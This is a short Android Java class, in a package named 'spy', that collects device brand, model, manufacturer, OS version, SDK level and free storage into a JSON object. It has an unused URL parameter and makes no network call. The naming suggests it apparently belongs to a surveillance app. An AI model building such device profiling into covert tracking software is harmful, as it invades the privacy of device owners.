package ai.m4zk1play.spy;

import android.os.Build;
import android.os.Environment;
import android.os.StatFs;

import org.json.JSONObject;

public final class Device {
    public static JSONObject info(String url) {
        JSONObject o = new JSONObject();
        try {
            o.put("brand", Build.BRAND);
            o.put("model", Build.MODEL);
            o.put("label", Build.MANUFACTURER + " " + Build.MODEL);
            o.put("android", Build.VERSION.RELEASE);
            o.put("sdk", Build.VERSION.SDK_INT);
            StatFs fs = new StatFs(Environment.getDataDirectory().getPath());
            o.put("storage_free", fs.getAvailableBytes());
        } catch (Exception ignored) {
        }
        return o;
    }
}
